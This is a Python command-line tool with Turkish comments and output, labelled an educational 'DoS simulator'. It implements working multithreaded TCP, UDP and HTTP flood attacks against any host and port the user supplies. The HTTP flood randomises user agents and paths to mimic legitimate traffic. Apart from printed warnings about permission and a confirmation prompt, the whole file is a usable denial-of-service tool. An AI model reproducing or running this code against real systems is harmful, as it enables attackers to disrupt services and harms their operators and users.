import argparse
import socket
import sys
import time
import random
import threading
from datetime import datetime


class RenkliYazi:
    KIRMIZI = '\033[91m'
    YESIL = '\033[92m'
    SARI = '\033[93m'
    MAVI = '\033[94m'
    TURKUAZ = '\033[96m'
    PEMBE = '\033[95m'
    BEYAZ = '\033[97m'
    SON = '\033[0m'
    KALIN = '\033[1m'


class DoSSimulator:
    def __init__(self, hedef, port, metot="tcp", sure=30, paket_boyutu=1024, 
                 thread_sayisi=5, cikti_dosyasi=None, verbose=False):
        self.hedef = hedef
        self.port = port
        self.metot = metot.lower()
        self.sure = sure
        self.paket_boyutu = paket_boyutu
        self.thread_sayisi = thread_sayisi
        self.cikti_dosyasi = cikti_dosyasi
        self.verbose = verbose
        self.baslangic_zamani = 0
        self.gonderilen_paket = 0
        self.basarili_paket = 0
        self.devam_et = True
        self.lock = threading.Lock()
        
    def rapor_yaz(self, mesaj):
        with self.lock:
            print(mesaj)
            if self.cikti_dosyasi:
                with open(self.cikti_dosyasi, "a") as f:
                    f.write(f"{mesaj}\n")
                    
    def ilerleme_goster(self):
        while self.devam_et:
            if self.baslangic_zamani > 0:
                gecen_sure = time.time() - self.baslangic_zamani
                if gecen_sure <= self.sure:
                    kalan_sure = self.sure - gecen_sure
                    yuzde = min(int(gecen_sure / self.sure * 100), 100)
                    with self.lock:
                        print(f"{RenkliYazi.BEYAZ}[*] İlerleme: %{yuzde} | " 
                              f"Kalan süre: {int(kalan_sure)}s | "
                              f"Paketler: {self.gonderilen_paket} "
                              f"(Başarılı: {self.basarili_paket}){RenkliYazi.SON}", end="\r")
            time.sleep(1)
    
    def tcp_flood(self):
        s = None
        try:
            while self.devam_et:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.hedef, self.port))
                    
                    icerik = "X" * self.paket_boyutu
                    
                    s.send(icerik.encode())
                    
                    with self.lock:
                        self.gonderilen_paket += 1
                        self.basarili_paket += 1
                        
                    if self.verbose:
                        self.rapor_yaz(f"{RenkliYazi.YESIL}[+] TCP paketi gönderildi! "
                                      f"Boyut: {self.paket_boyutu}{RenkliYazi.SON}")
                    
                    s.close()
                    s = None
                    
                except socket.error as e:
                    with self.lock:
                        self.gonderilen_paket += 1
                    if self.verbose:
                        self.rapor_yaz(f"{RenkliYazi.KIRMIZI}[-] Hata: {str(e)}{RenkliYazi.SON}")
                
                # Süre kontrolü
                if time.time() - self.baslangic_zamani >= self.sure:
                    break
                    
        except Exception as e:
            if self.verbose:
                self.rapor_yaz(f"{RenkliYazi.KIRMIZI}[!] TCP işlemi hatası: {str(e)}{RenkliYazi.SON}")
        finally:
            if s:
                s.close()
    
    def udp_flood(self):
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.devam_et:
                try:
                    # Rastgele içerik oluştur
                    icerik = "X" * self.paket_boyutu
                    
                    s.sendto(icerik.encode(), (self.hedef, self.port))
                    
                    with self.lock:
                        self.gonderilen_paket += 1
                        self.basarili_paket += 1
                        
                    if self.verbose:
                        self.rapor_yaz(f"{RenkliYazi.YESIL}[+] UDP paketi gönderildi! "
                                      f"Boyut: {self.paket_boyutu}{RenkliYazi.SON}")
                    
                except socket.error as e:
                    with self.lock:
                        self.gonderilen_paket += 1
                    if self.verbose:
                        self.rapor_yaz(f"{RenkliYazi.KIRMIZI}[-] Hata: {str(e)}{RenkliYazi.SON}")
                
                # Süre kontrolü
                if time.time() - self.baslangic_zamani >= self.sure:
                    break
                    
        except Exception as e:
            if self.verbose:
                self.rapor_yaz(f"{RenkliYazi.KIRMIZI}[!] UDP işlemi hatası: {str(e)}{RenkliYazi.SON}")
        finally:
            if s:
                s.close()
                
    def http_flood(self):
        s = None
        try:
            while self.devam_et:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.hedef, self.port))
                    
                    # HTTP isteği
                    user_agents = [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                        "Mozilla/5.0 (Android 10; Mobile) AppleWebKit/537.36"
                    ]
                    
                    yollar = ["/", "/index.html", "/home", "/about", "/contact", 
                            "/products", "/services", "/login", "/register", "/api"]
                    
                    user_agent = random.choice(user_agents)
                    yol = random.choice(yollar)
                    
                    http_request = f"GET {yol} HTTP/1.1\r\n"
                    http_request += f"Host: {self.hedef}\r\n"
                    http_request += f"User-Agent: {user_agent}\r\n"
                    http_request += "Accept: text/html,application/xhtml+xml,application/xml\r\n"
                    http_request += "Connection: keep-alive\r\n\r\n"
                    
                    s.send(http_request.encode())
                    
                    with self.lock:
                        self.gonderilen_paket += 1
                        self.basarili_paket += 1
                        
                    if self.verbose:
                        self.rapor_yaz(f"{RenkliYazi.YESIL}[+] HTTP isteği gönderildi! "
                                      f"Yol: {yol}{RenkliYazi.SON}")
                    
                    # Yanıtı bekle (isteğe bağlı)
                    # s.recv(4096)
                    
                    s.close()
                    s = None
                    
                except socket.error as e:
                    with self.lock:
                        self.gonderilen_paket += 1
                    if self.verbose:
                        self.rapor_yaz(f"{RenkliYazi.KIRMIZI}[-] HTTP Hatası: {str(e)}{RenkliYazi.SON}")
                
                # Süre kontrolü
                if time.time() - self.baslangic_zamani >= self.sure:
                    break
                    
        except Exception as e:
            if self.verbose:
                self.rapor_yaz(f"{RenkliYazi.KIRMIZI}[!] HTTP işlemi hatası: {str(e)}{RenkliYazi.SON}")
        finally:
            if s:
                s.close()
            
    def simulasyon_baslat(self):
        # Hedef kontrolü
        try:
            socket.gethostbyname(self.hedef)
        except socket.error:
            self.rapor_yaz(f"{RenkliYazi.KIRMIZI}[!] Hata: Hedef çözümlenemedi: {self.hedef}{RenkliYazi.SON}")
            return False
        
        self.rapor_yaz(f"\n{RenkliYazi.MAVI}{RenkliYazi.KALIN}[*] DoS Simülasyon Bilgileri:{RenkliYazi.SON}")
        self.rapor_yaz(f"{RenkliYazi.MAVI}[*] Hedef: {self.hedef}:{self.port}")
        self.rapor_yaz(f"[*] Metot: {self.metot.upper()}")
        self.rapor_yaz(f"[*] Süre: {self.sure} saniye")
        self.rapor_yaz(f"[*] Thread sayısı: {self.thread_sayisi}")
        self.rapor_yaz(f"[*] Paket boyutu: {self.paket_boyutu} byte")
        self.rapor_yaz(f"[*] Ayrıntılı mod: {'Açık' if self.verbose else 'Kapalı'}{RenkliYazi.SON}")
        
        self.rapor_yaz(f"\n{RenkliYazi.SARI}{RenkliYazi.KALIN}[!] EĞİTİM AMAÇLI UYARI:{RenkliYazi.SON}")
        self.rapor_yaz(f"{RenkliYazi.SARI}[!] Bu araç yalnızca eğitim amaçlıdır.")
        self.rapor_yaz(f"[!] Yalnızca kendi sistemlerinizde veya izin aldığınız sistemlerde kullanın.")
        self.rapor_yaz(f"[!] İzinsiz kullanımı yasalara aykırıdır ve cezai yaptırımları vardır.{RenkliYazi.SON}")
        
        onay = input(f"\n{RenkliYazi.KIRMIZI}[?] Simülasyonu başlatmak istiyor musunuz? (e/h): {RenkliYazi.SON}")
        if onay.lower() != 'e':
            self.rapor_yaz(f"{RenkliYazi.TURKUAZ}[*] Simülasyon iptal edildi.{RenkliYazi.SON}")
            return False
        
        self.rapor_yaz(f"\n{RenkliYazi.SARI}[*] DoS simülasyonu başlatılıyor...{RenkliYazi.SON}")
        
        self.baslangic_zamani = time.time()
        self.devam_et = True
        
        # İlerleme gösterme thread'i
        ilerleme_thread = threading.Thread(target=self.ilerleme_goster)
        ilerleme_thread.daemon = True
        ilerleme_thread.start()
        
        # Saldırı thread'leri
        threads = []
        for _ in range(self.thread_sayisi):
            if self.metot == "tcp":
                t = threading.Thread(target=self.tcp_flood)
            elif self.metot == "udp":
                t = threading.Thread(target=self.udp_flood)
            elif self.metot == "http":
                t = threading.Thread(target=self.http_flood)
            else:
                self.rapor_yaz(f"{RenkliYazi.KIRMIZI}[!] Geçersiz metot: {self.metot}{RenkliYazi.SON}")
                self.devam_et = False
                return False
            
            threads.append(t)
            t.daemon = True
            t.start()
        
        try:
            # Ana thread süre sonuna kadar bekler
            time.sleep(self.sure)
            self.devam_et = False
            
            # Thread'lerin bitmesini bekle
            for t in threads:
                t.join(timeout=2)
            
            ilerleme_thread.join(timeout=2)
            
        except KeyboardInterrupt:
            self.rapor_yaz(f"\n{RenkliYazi.KIRMIZI}[!] Kullanıcı tarafından durduruldu.{RenkliYazi.SON}")
            self.devam_et = False
            
            for t in threads:
                t.join(timeout=2)
            
            ilerleme_thread.join(timeout=2)
        
        # Sonuçları göster
        bitis_zamani = time.time()
        gecen_sure = bitis_zamani - self.baslangic_zamani
        
        self.rapor_yaz(f"\n{RenkliYazi.TURKUAZ}[*] DoS simülasyonu tamamlandı")
        self.rapor_yaz(f"[*] Toplam geçen süre: {gecen_sure:.2f} saniye")
        self.rapor_yaz(f"[*] Gönderilen paket sayısı: {self.gonderilen_paket}")
        self.rapor_yaz(f"[*] Başarılı paket sayısı: {self.basarili_paket}")
        self.rapor_yaz(f"[*] Saniyede ortalama paket: {int(self.gonderilen_paket/max(gecen_sure, 1))}{RenkliYazi.SON}")
        
        return True


def main():
    parser = argparse.ArgumentParser(
        description="DoS Simülatörü (Eğitim Amaçlı)",
        epilog="UYARI: Bu araç yalnızca eğitim amaçlıdır ve kendi sistemlerinizde test edilmelidir."
    )
    parser.add_argument("-t", "--target", required=True, help="Hedef IP adresi veya alan adı")
    parser.add_argument("-p", "--port", type=int, required=True, help="Hedef port numarası")
    parser.add_argument("-m", "--method", default="tcp", choices=["tcp", "udp", "http"], 
                       help="Saldırı metodu (tcp, udp, http)")
    parser.add_argument("-d", "--duration", type=int, default=30, 
                       help="Simülasyon süresi (saniye)")
    parser.add_argument("-s", "--size", type=int, default=1024, 
                       help="Paket boyutu (byte)")
    parser.add_argument("-th", "--threads", type=int, default=5, 
                       help="Thread sayısı")
    parser.add_argument("-o", "--output", help="Sonucun kaydedileceği dosya")
    parser.add_argument("-v", "--verbose", action="store_true", 
                       help="Ayrıntılı çıktılar göster")
    
    args = parser.parse_args()
    
    try:
        simulator = DoSSimulator(
            hedef=args.target,
            port=args.port,
            metot=args.method,
            sure=args.duration,
            paket_boyutu=args.size,
            thread_sayisi=args.threads,
            cikti_dosyasi=args.output,
            verbose=args.verbose
        )
        simulator.simulasyon_baslat()
        
    except KeyboardInterrupt:
        print(f"\n{RenkliYazi.KIRMIZI}[!] Kullanıcı tarafından sonlandırıldı.{RenkliYazi.SON}")
    except Exception as e:
        print(f"\n{RenkliYazi.KIRMIZI}[!] Hata: {str(e)}{RenkliYazi.SON}")


if __name__ == "__main__":
    print(f"{RenkliYazi.KALIN}{RenkliYazi.SARI}")
    print("  ___      ___ ")
    print(" |   \\    /   |")
    print(" | |\\ \\  / /| |  DoS Simülatörü")
    print(" | | \\ \\/ / | |  Eğitim Amaçlı")
    print(" | |  \\__/  | |")
    print(" |_|        |_|")
    print(f"{RenkliYazi.SON}")
    
    main() 